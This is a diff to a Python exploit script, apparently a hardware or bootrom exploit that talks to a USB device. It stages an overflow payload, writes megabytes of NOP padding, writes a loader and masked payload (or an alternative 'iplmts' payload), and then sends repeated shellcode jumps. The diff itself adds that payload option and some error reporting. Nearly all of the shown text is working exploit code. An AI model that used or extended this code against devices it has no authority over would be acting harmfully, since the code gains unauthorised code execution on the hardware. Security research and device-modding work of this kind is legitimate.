@@ -147,14 +147,17 @@ class Exploit:
         assert self.args.stage4 % 4 == 0
 
     def build_payload(self):
-        loader = PayloadBuilder("loader.S").build(base=0xDEAD0000)
-        assert loader[-4:] == b"\xEF\xBE\xAD\xDE"
-        loader = loader[:-4]
-        payload = PayloadBuilder("payload.c").build(base=0x80000000)
-        self.payload = loader + mask_payload(payload)
+        if self.args.iplmts:
+            self.payload = PayloadBuilder("iplmts.S").build(base=0xDEAD0000)
+        else:
+            loader = PayloadBuilder("loader.S").build(base=0xDEAD0000)
+            assert loader[-4:] == b"\xEF\xBE\xAD\xDE"
+            loader = loader[:-4]
+            payload = PayloadBuilder("payload.c").build(base=0x80000000)
+            self.payload = loader + mask_payload(payload)
+
         while len(self.payload) % 4 != 0:
             self.payload += b"\x00"
-        print("payload size: 0x{:X}".format(len(self.payload)))
 
     def write_fully(self, buffer):
         assert b"\xFE" not in buffer and b"\xFF" not in buffer
@@ -219,13 +222,19 @@ class Exploit:
         self.write_fully(overflow_payload)
 
         print("2) {:.2f} MB of nops".format(self.args.stage2 / 1024 / 1024))
-        with tqdm(total=self.args.stage2, unit='B', unit_scale=True, unit_divisor=1024) as bar:
-            for x in range(0, self.args.stage2, 64):
-                chunk = b"\x00" * min(64, self.args.stage2 - x)
-                assert self.dev.write(0x8, chunk) == len(chunk)
-                bar.update(len(chunk))
+        total = 0
+        try:
+            with tqdm(total=self.args.stage2, unit='B', unit_scale=True, unit_divisor=1024) as bar:
+                for x in range(0, self.args.stage2, 64):
+                    chunk = b"\x00" * min(64, self.args.stage2 - x)
+                    assert self.dev.write(0x8, chunk) == len(chunk)
+                    bar.update(len(chunk))
+                    total += len(chunk)
+        except Exception:
+            print("wrote before exception: 0x{:X}".format(total))
+            raise
 
-        print("3) write payload")
+        print("3) write payload size=0x{:X}".format(len(self.payload)))
         self.write_fully(self.payload)
 
         print("4) spam shellcode jump")
